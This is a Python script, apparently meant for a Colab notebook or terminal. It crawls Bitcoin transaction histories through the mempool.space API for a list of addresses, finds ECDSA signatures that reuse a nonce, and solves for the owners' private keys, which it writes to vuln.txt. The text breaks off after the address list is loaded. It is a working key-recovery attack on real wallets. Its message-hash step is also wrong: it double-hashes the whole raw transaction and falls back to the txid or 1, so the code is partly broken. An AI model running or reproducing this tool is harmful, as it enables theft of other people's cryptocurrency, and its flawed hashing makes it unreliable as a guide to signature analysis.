cat << 'EOF' > Scanxy.py
import os, sys, time, json, signal, binascii, hashlib, requests
from datetime import datetime
from collections import defaultdict

try:
    from google.colab import files
    from IPython.display import clear_output
    IN_NOTEBOOK = True
except ImportError:
    IN_NOTEBOOK = False

class UIColors:
    RESET, CYAN, BLUE, WHITE, YELLOW, RED, ORANGE, GREEN, MAGENTA, BRIGHT_WHITE = '\033[0m', '\033[36m', '\033[34m', '\033[37m', '\033[33m', '\033[31m', '\033[93m', '\033[32m', '\033[35m', '\033[97m'

API_PROVIDER_PRIORITY = "mempool"
API_REGISTRY = {
    "mempool": {
        "base_url": "https://mempool.space",
        "tx_endpoint": "/address/{address}/txs",
        "tx_paging_endpoint": "/address/{address}/txs/chain/{txid}",
        "raw_tx_endpoint": "/tx/{txid}/hex"
    }
}

# --- SECP256k1 Curve Constants ---
N = 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFEBAAEDCE6AF48A03BBFD25E8CD0364141

metrics = {"total_addresses": 0, "scanned_addresses": 0, "vulnerable_addresses": 0, "current_target": "None", "vulnerability_counts": defaultdict(int), "vulnerable_log": []}
app_should_exit = False

def handle_shutdown_signal(signum, frame):
    global app_should_exit
    print(f"\n{UIColors.YELLOW}[!] Break signal caught. Stopping scanner loop safely...{UIColors.RESET}")
    app_should_exit = True

try:
    signal.signal(signal.SIGINT, handle_shutdown_signal)
    signal.signal(signal.SIGTERM, handle_shutdown_signal)
except ValueError:
    pass

def parse_der_signature(sig_hex):
    try:
        sig_bytes = binascii.unhexlify(sig_hex)
        if len(sig_bytes) < 8 or sig_bytes[0] != 0x30: return None
        if sig_bytes[2] != 0x02: return None
        r_len = sig_bytes[3]
        r_bytes = sig_bytes[4:4+r_len]
        s_tag_idx = 4 + r_len
        if sig_bytes[s_tag_idx] != 0x02: return None
        s_len = sig_bytes[s_tag_idx + 1]
        s_start = s_tag_idx + 2
        s_bytes = sig_bytes[s_start:s_start + s_len]
        return int.from_bytes(r_bytes, 'big'), int.from_bytes(s_bytes, 'big')
    except: return None

def fetch_cryptographic_z_value(txid):
    config = API_REGISTRY[API_PROVIDER_PRIORITY]
    try:
        res = requests.get(f"{config['base_url']}{config['raw_tx_endpoint'].format(txid=txid)}", timeout=10)
        if res.status_code == 200:
            tx_hex = res.text.strip()
            raw_tx = binascii.unhexlify(tx_hex)
            first_sha = hashlib.sha256(raw_tx).digest()
            second_sha = hashlib.sha256(first_sha).digest()
            return int.from_bytes(second_sha, 'big')
    except: pass
    try: return int(txid, 16)
    except: return 1

def solve_private_key(r, s1, s2, z1, z2):
    """
    Solves for the private key using modular field inverses over the SECP256k1 order N.
    d = ((z1 * s2) - (z2 * s1)) * (r * (s1 - s2))^-1 mod N
    """
    try:
        if s1 == s2: return None
        numerator = (z1 * s2 - z2 * s1) % N
        denominator = (r * (s1 - s2)) % N
        if denominator == 0: return None
        
        # Compute modular inverse
        inv_denom = pow(denominator, N - 2, N)
        private_key = (numerator * inv_denom) % N
        return private_key
    except: return None

def refresh_dashboard_ui():
    if IN_NOTEBOOK: clear_output(wait=True)
    else: os.system('cls' if os.name == 'nt' else 'clear')
    print(f"{UIColors.CYAN}{'='*80}")
    print(f"{UIColors.BLUE}🔍 Automated Key Solver & Pagination Crawling JSON Engine")
    print(f"{UIColors.WHITE}📅 Active Runtime: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
    print(f"{UIColors.CYAN}{'='*80}{UIColors.RESET}")
    print(f"{UIColors.BRIGHT_WHITE}📊 Scanning Session Metrics:")
    print(f"  • Total Load Pool:  {UIColors.YELLOW}{metrics['total_addresses']}{UIColors.RESET}")
    print(f"  • Scanned Complete: {UIColors.CYAN}{metrics['scanned_addresses']}{UIColors.RESET}")
    print(f"  • Critical Exploits: {UIColors.RED}{metrics['vulnerable_addresses']}{UIColors.RESET}")
    print(f"{UIColors.CYAN}{'='*80}{UIColors.RESET}")
    
    for k, sev, color in [("Reused Nonce", "HIGH", UIColors.RED), ("Small K", "HIGH", UIColors.ORANGE)]:
        print(f"  • {color}[{sev}]{UIColors.RESET} {k.ljust(25)} ➜ Matches: {UIColors.YELLOW}{metrics['vulnerability_counts'][k]}{UIColors.RESET}")
        
    print(f"\n🔎 Target: {UIColors.MAGENTA}{metrics['current_target']}{UIColors.RESET}")
    print(f"\n⚠️ Flagged Logs:")
    if not metrics['vulnerable_log']: print(f"  {UIColors.GREEN}No high-risk vulnerabilities flagged.{UIColors.RESET}")
    else:
        for alert in metrics['vulnerable_log'][-5:]: print(f"  {UIColors.RED}➜ SOLVED KEY MATCH: {alert}{UIColors.RESET}")

def deep_analyze_signatures(address, detected_signatures):
    r_records = {} 
    
    for r_val, s_val, txid, z_val in detected_signatures:
        if r_val in r_records:
            metrics['vulnerable_addresses'] += 1
            metrics['vulnerability_counts']['Reused Nonce'] += 1
            orig_s, orig_txid, orig_z = r_records[r_val]
            
            # Fire Key Solver
            resolved_d = solve_private_key(r_val, orig_s, s_val, orig_z, z_val)
            d_hex = hex(resolved_d) if resolved_d else "Solution_Failed"
            
            log_msg = f"Addr: {address[:6]}... | Key Found: {d_hex[:10]}..."
            metrics['vulnerable_log'].append(log_msg)
            
            # Format and Append output directly into valid clean JSON object logs
            try:
                log_entry = {
                    "timestamp": datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
                    "target_address": address,
                    "shared_r": hex(r_val),
                    "solved_private_key_hex": d_hex,
                    "pair_1": {"txid": orig_txid, "s": hex(orig_s), "z": hex(orig_z)},
                    "pair_2": {"txid": txid, "s": hex(s_val), "z": hex(z_val)}
                }
                
                # Append line-by-line JSON string data objects safely to workspace
                with open("vuln.txt", "a", encoding="utf-8") as f:
                    f.write(json.dumps(log_entry, indent=2) + ",\n")
            except: pass
        else: 
            r_records[r_val] = (s_val, txid, z_val)
            
        if r_val < 2**64: metrics['vulnerability_counts']['Small K'] += 1

def extract_signatures_from_tx_history(address, transactions):
    extracted = []
    if not isinstance(transactions, list): return extracted
    
    for tx in transactions:
        txid = tx.get("txid", "Unknown_TXID")
        for tx_input in tx.get("vin", []):
            if tx_input.get("prevout", {}).get("scriptpubkey_address") != address: continue
            
            sig_hex = ""
            script_sig = tx_input.get("scriptsig", "")
            if script_sig and (script_sig.startswith("473044") or script_sig.startswith("483045")):
                sig_hex = script_sig[2:144]
            
            witness = tx_input.get("witness", [])
            if isinstance(witness, list) and len(witness) >= 1:
                first_item = str(witness[0])
                if first_item.startswith("3044") or first_item.startswith("3045"): sig_hex = first_item
                    
            if sig_hex:
                if len(sig_hex) > 140 and (sig_hex.endswith("01") or sig_hex.endswith("81")): sig_hex = sig_hex[:-2]
                parsed = parse_der_signature(sig_hex)
                if parsed: 
                    r_val, s_val = parsed
                    z_val = fetch_cryptographic_z_value(txid)
                    extracted.append((r_val, s_val, txid, z_val))
    return extracted

def execute_scan_worker(target_address):
    global app_should_exit
    metrics['current_target'] = target_address
    metrics['scanned_addresses'] += 1
    config = API_REGISTRY[API_PROVIDER_PRIORITY]
    
    all_sigs = []
    last_txid = None
    max_pages = 10 # Change this parameters boundary to increase or decrease scanning depth limits
    
    for page in range(max_pages):
        if app_should_exit: break
        
        # Build standard versus paginated crawler URLs based on current search depth states
        if page == 0:
            target_url = f"{config['base_url']}{config['tx_endpoint'].format(address=target_address)}"
        else:
            target_url = f"{config['base_url']}{config['tx_paging_endpoint'].format(address=target_address, txid=last_txid)}"
            
        try:
            res = requests.get(target_url, timeout=12)
            if res.status_code != 200: break
            
            tx_list = res.json()
            if not isinstance(tx_list, list) or len(tx_list) == 0: break
            
            found_sigs = extract_signatures_from_tx_history(target_address, tx_list)
            if found_sigs: all_sigs.extend(found_sigs)
            
            # Track the final transaction ID element to use as the next pagination anchor pointer
            last_txid = tx_list[-1].get("txid")
            if len(tx_list) < 25: break # API returns fewer than 25 objects when reaching the historical end block
            time.sleep(0.5) # Anti rate-limit cushion spacing
        except: break
        
    if all_sigs and not app_should_exit:
        deep_analyze_signatures(target_address, all_sigs)

if __name__ == "__main__":
    try:
        with open("vuln.txt", "w", encoding="utf-8") as f:
            f.write("[\n") # Initialize array structure context bracket for easy JSON compliance
    except IOError: pass

    target_pool = []
    source_filename = "Addresses.txt" if os.path.exists("Addresses.txt") else "addresses.txt"
    if os.path.exists(source_filename):
        try:
            with open(source_filename, "r", encoding="utf-8") as entry_file:
                for line in entry_file:
                    clean_addr = line.strip().replace(",", "")
                    if clean_addr and not clean_addr.startswith("#"): target_pool.append(clean_addr)
        except: pass
        
